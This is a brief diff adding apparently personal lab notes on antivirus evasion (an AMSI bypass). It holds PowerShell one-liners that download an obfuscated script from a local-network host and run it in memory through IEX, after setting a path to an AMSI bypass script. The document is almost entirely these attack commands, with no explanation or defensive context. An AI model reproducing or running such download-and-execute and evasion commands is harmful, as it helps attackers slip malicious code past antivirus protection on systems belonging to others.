@@ -1,0 +1,16 @@
+Write script on disk and execute 2 times
+
+
+
+SET SCRIPTPATH   /home/garuda/AVEvasion/AMSIbypass/3plain.ps1
+
+
+
+
+
+(New-Object System.Net.WebClient).DownloadFile('http://192.168.56.1/3obf.ps1','C:\Users\Public\Downloads\3obf.ps1') 
+
+
+powershell.exe IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.56.1/3obf.ps1')
+
+
